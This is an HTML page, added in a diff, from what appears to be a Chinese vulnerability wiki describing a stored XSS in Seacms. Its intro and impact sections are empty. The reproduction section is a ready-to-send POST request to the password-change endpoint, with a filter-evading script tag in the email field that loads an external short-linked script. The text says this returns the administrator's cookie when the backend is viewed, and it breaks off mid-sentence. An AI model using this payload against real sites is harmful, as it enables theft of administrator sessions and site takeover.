@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Seacms/Seacms%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Seacms 储存型xss - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Seacms \u50a8\u5b58\u578bxss", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Seacms%20%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Seacms%20%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-link">
+        seacms getshell
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Seacms%20_%3D%209.92%20%E5%89%8D%E5%8F%B0Getshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Seacms%20_%3D%209.92%20%E5%89%8D%E5%8F%B0Getshell/" class="btn btn-xs btn-link">
+        Seacms \&lt;= 9.92 前台Getshell
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="seacms-xss">Seacms 储存型xss<a class="headerlink" href="#seacms-xss" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><code>POST<span class="w"> </span>/member.php?action=chgpwdsubmit
+
+oldpwd=test<span class="err">&amp;</span>newpwd=test<span class="err">&amp;</span>newpwd2=test<span class="err">&amp;</span>email=test%40test.com<span class="nt">&lt;scbase64ript</span><span class="w"> </span><span class="na">src=</span><span class="s">https://url.cn/585l00F</span><span class="nt">&gt;&lt;/scrbase64ipt&gt;</span><span class="err">&amp;</span>nickname=<span class="err">&amp;</span>gaimi=%E7%A1%AE%E8%AE%A4%E4%BF%AE%E6%94%B9
+</code></pre></div>
+
+<h3 id="srchttp127001testjs">src的值为<a href="http://127.0.0.1/test.js的短链接">http://127.0.0.1/test.js的短链接</a><a class="headerlink" href="#srchttp127001testjs" title="Permanent link">&para;</a></h3>
+<p>当后台浏览到后台界面时，会触发漏洞，反弹回来Cookie，但需要注意两点，第一，只有系统管理员才能看到用户界面，普通管理</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Seacms%20%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Seacms%20%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-link">
+        seacms getshell
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Seacms%20_%3D%209.92%20%E5%89%8D%E5%8F%B0Getshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Seacms%20_%3D%209.92%20%E5%89%8D%E5%8F%B0Getshell/" class="btn btn-xs btn-link">
+        Seacms \&lt;= 9.92 前台Getshell
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
